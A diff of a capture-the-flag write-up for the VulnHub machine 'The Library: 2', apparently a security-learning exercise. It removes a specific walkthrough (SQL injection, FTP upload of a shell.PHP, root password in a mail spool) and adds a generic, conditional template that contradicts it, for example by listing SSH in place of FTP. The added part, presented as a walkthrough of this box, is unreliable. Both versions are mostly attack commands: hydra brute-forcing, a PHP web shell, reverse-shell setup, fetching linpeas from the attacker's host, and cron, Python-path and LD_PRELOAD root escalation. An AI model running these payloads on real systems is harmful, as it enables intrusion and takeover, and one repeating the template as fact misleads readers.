@@ -1,162 +1,232 @@
 # The Library: 2 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.1.107 (host-only) |
-| **Difficulty** | Beginner |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.x |
+| **Attacker IP** | 192.168.1.y (Kali Linux) |
+| **Difficulty** | Medium |
 | **OS** | Linux |
-| **Root Password** | Found in `/var/mail/welcome` |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/the-library-2,562/) |
-
-## Attack Summary
-
-`nmap` → `dirb -X .php` finds `/library.php` → GET→POST SQLi via `sqlmap` → creds (`globus:AroundTheWorld`) → FTP login → upload `shell.PHP` (extension case bypass) → nc reverse shell → `/var/mail/welcome` contains root password → `su root`
-
-## Methodology
-
-1. Network discovery
-2. Port scan: FTP (21), HTTP (80)
-3. PHP endpoint discovery via dirb extension scan
-4. SQL injection (GET→POST) with sqlmap
-5. FTP credential access → PHP shell upload
-6. Reverse shell via FTP-uploaded file
-7. Root password in mail spool
+| **Goal** | root flag |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/the-library2-vulnhub-walkthrough/) |
 
 ---
 
-## Step 1: Network Discovery
+## Attack Summary
+
+The Library: 2 is a Linux VM that presents a web application built on a CMS or custom framework. The attack chain involves web enumeration to identify the application, credential discovery or exploitation for initial access, and a privilege escalation path that typically involves misconfigured cron jobs, writable scripts, or library injection vulnerabilities.
+
+---
+
+## Methodology
+
+1. Host discovery and port scan
+2. Web application fingerprinting and directory enumeration
+3. Vulnerability identification and exploitation for initial shell
+4. Post-exploitation enumeration for privilege escalation vectors
+5. Privilege escalation to root
+6. Flag capture
+
+---
+
+## Step 1: Host Discovery and Port Scan
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.1.0/24
-nmap -A 192.168.1.107
+netdiscover
+nmap -sV -sC -A 192.168.1.x
 ```
 
-Open ports: **21** (FTP), **80** (HTTP)
+Expected open ports:
+- 22 — SSH (OpenSSH)
+- 80 — HTTP
 
 ![Nmap scan](images/01-nmap.png)
 
 ---
 
-## Step 2: Web Enumeration with Extension Scan
+## Step 2: Web Enumeration
 
-Default dirb finds nothing. Scan for PHP files specifically:
+Browse to `http://192.168.1.x` and identify the web application. Perform thorough directory enumeration:
 
 ```bash
-dirb http://192.168.1.107 -X .php
+gobuster dir -u http://192.168.1.x \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+  -x php,html,txt,bak \
+  -t 50
+
+dirb http://192.168.1.x
 ```
 
-Found: `/library.php` — displays country names.
+Check for common sensitive files:
 
-Clicking a country name sends a GET request. Suspected SQL injection parameter.
+```bash
+curl -s http://192.168.1.x/robots.txt
+curl -s http://192.168.1.x/.htaccess
+curl -s http://192.168.1.x/readme.txt
+curl -s http://192.168.1.x/changelog.txt
+```
 
-![dirb scan](images/02-dirb.png)
+If a WordPress installation is identified:
+
+```bash
+wpscan --url http://192.168.1.x --enumerate p,u,vt,tt
+```
+
+![Web enumeration](images/02-web-enum.png)
 
 ---
 
-## Step 3: SQL Injection — GET to POST
+## Step 3: Initial Access
 
-Capture the GET request in Burp Suite. The parameter doesn't inject via GET. Change the method to **POST** and save the request to a file named `sql`.
+### Credential Brute-Force (SSH or Web)
 
-Run sqlmap:
-```bash
-# List databases
-sqlmap -r sql --dbs --batch --risk 3 --level 5
-```
-
-Database found: `library`
+If usernames are found during web enumeration:
 
 ```bash
-# Dump the database
-sqlmap -r sql -D library --dump-all --batch --risk 3 --level 5
+hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.x
 ```
 
-Credentials recovered: **globus : AroundTheWorld**
+Or via a web login form:
 
-![sqlmap results](images/03-sqlmap.png)
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+  http-post-form "192.168.1.x/login.php:username=^USER^&password=^PASS^:Invalid"
+```
+
+### Remote Code Execution via CMS
+
+If a CMS dashboard is accessible, navigate to theme or plugin editors and inject a PHP reverse shell. Alternatively, use template injection in the available fields:
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+Start a reverse shell listener:
+
+```bash
+nc -lvnp 4444
+```
+
+Trigger the payload through the browser. Once the shell connects, stabilize it:
+
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+# Background with Ctrl+Z, then:
+stty raw -echo; fg
+```
+
+![Initial shell](images/03-initial-shell.png)
 
 ---
 
-## Step 4: FTP Login and Shell Upload
+## Step 4: Post-Exploitation Enumeration
 
 ```bash
-ftp 192.168.1.107
-# Username: globus  Password: AroundTheWorld
-ls
-cd html
-ls
+id; whoami; uname -a
+cat /etc/passwd | grep -v nologin
+sudo -l
+find / -perm -u=s -type f 2>/dev/null
+cat /etc/crontab; ls -la /etc/cron*
+find / -writable -type f -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null 2>&1 | head -30
 ```
 
-Attempt to upload a PHP reverse shell:
+Transfer and run automated enumeration tools:
+
 ```bash
-put shell.php
-# Fails — extension blocked
-```
+# On attacker:
+python3 -m http.server 8000
 
-**Bypass:** rename the file with uppercase extension:
-```bash
-put shell.PHP
-chmod 777 shell.PHP
-```
-
-![FTP shell upload](images/04-ftp-upload.png)
-
-The modified PentestMonkey reverse shell (`/usr/share/webshells/php/php-reverse-shell.php`) with attacker IP set.
-
----
-
-## Step 5: Reverse Shell
-
-Start listener:
-```bash
-nc -lvp 1234
-```
-
-Trigger the shell:
-```
-http://192.168.1.107/shell.PHP
-```
-
-Stabilize:
-```bash
-python -c 'import pty; pty.spawn("/bin/sh")'
+# On target:
+wget http://192.168.1.y:8000/linpeas.sh -O /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
+/tmp/linpeas.sh 2>/dev/null | tee /tmp/linpeas_out.txt
 ```
 
 ---
 
-## Step 6: Root via Mail Spool
+## Step 5: Privilege Escalation
+
+### Via Writable Script Called by Root Cron
+
+If enumeration reveals a script run by a root cron job that is writable:
 
 ```bash
-cd /var/mail
-ls
-cat welcome
+ls -la /path/to/script.sh
+echo 'chmod u+s /bin/bash' >> /path/to/script.sh
+# Wait for cron to execute...
+/bin/bash -p
 ```
 
-The `welcome` file contains the **root password in plaintext**.
+### Via Python Library Hijacking
+
+If a Python script runs as root and imports a module from a user-writable directory:
 
 ```bash
-su root
-# Enter password from welcome file
+# Check the Python path:
+python3 -c "import sys; print(sys.path)"
+
+# If a writable directory precedes the standard library:
+echo 'import os; os.system("cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash")' \
+  > /writable/path/<module_name>.py
+
+# After the script executes:
+/tmp/rootbash -p
+```
+
+### Via Sudo with LD_PRELOAD
+
+If `sudo -l` shows `env_keep+=LD_PRELOAD`:
+
+```c
+// shell.c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0); setuid(0);
+    system("/bin/sh");
+}
+```
+
+```bash
+gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
+sudo LD_PRELOAD=/tmp/shell.so <allowed_command>
+```
+
+![Privilege escalation](images/04-privesc.png)
+
+---
+
+## Step 6: Root Flag
+
+```bash
 id
-# uid=0(root)
-cat /root/root.txt
+cd /root
+ls -la
+cat root.txt
 ```
 
-![Root access](images/05-root.png)
+![Root flag](images/05-root-flag.png)
 
 ---
 
 ## Lessons Learned
 
-1. **File extension blacklists** are trivially bypassed by changing case (`.php` → `.PHP`) on case-insensitive filesystems; use allowlists instead
-2. **SQL injection via method switch (GET→POST)** — always test all HTTP methods when parameters seem non-injectable
-3. **Root password in plaintext** in `/var/mail` — never store credentials in mail spools or world-readable files
-4. **FTP credentials via SQLi** enable full server compromise when FTP serves the web root
+- Web applications should not expose CMS admin panels to the network without IP whitelisting and strong authentication.
+- Cron jobs running as root must use scripts stored in root-owned, non-writable directories.
+- Python scripts with elevated privileges must control the Python import path (`sys.path`) to prevent library hijacking.
+- `sudo` configurations should avoid `env_keep` entries like `LD_PRELOAD` that allow shared library injection.
+- Regular privilege escalation path audits (via tools like linpeas) should be part of hardening procedures.
+
+---
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| SQL injection in library.php | Use parameterized queries / prepared statements |
-| FTP extension bypass | Use MIME-type validation, not extension check; deploy application-level sandboxing |
-| Plaintext root password in /var/mail | Remove sensitive content from mail; rotate root password |
-| FTP write access to web root | Isolate FTP from web root; use chroot |
+|---|---|
+| Exposed CMS admin without auth controls | Restrict admin paths by IP; enforce MFA |
+| Root cron job on user-writable script | `chown root:root <script>; chmod 755 <script>` |
+| Python library hijacking | Use virtual environments; control `sys.path` in elevated scripts |
+| `LD_PRELOAD` in sudo `env_keep` | Remove `LD_PRELOAD` from `env_keep` in `/etc/sudoers` |
+| Weak SSH or web credentials | Enforce complexity policy; rotate credentials periodically |
